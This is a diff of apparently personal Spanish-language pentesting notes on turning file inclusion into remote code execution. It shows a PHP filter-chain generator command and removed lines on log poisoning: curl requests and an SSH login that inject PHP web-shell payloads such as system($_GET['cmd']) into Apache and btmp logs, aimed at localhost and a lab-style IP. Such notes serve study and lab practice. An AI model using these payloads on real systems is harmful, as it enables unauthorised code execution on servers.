@@ -17,10 +17,3 @@ Podemos generar cadenas falopa las cuales nos permiten hacer RCEs.
 python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
 
 ## Log Poisoning
-Hay que tener cuidado con esta tecnica ya que si escribimos mal los comando o ponemos mal las comillas podemos contaminar por completo el log y asi lo dejariamos de leer evitando que interprete nuestro codigo.
-Comandos bien escritos:
-==/var/log/apache2/access.log== (Logs de apache)
-curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
-curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
-==/var/log/btmp== (Logs de ssh)
-ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
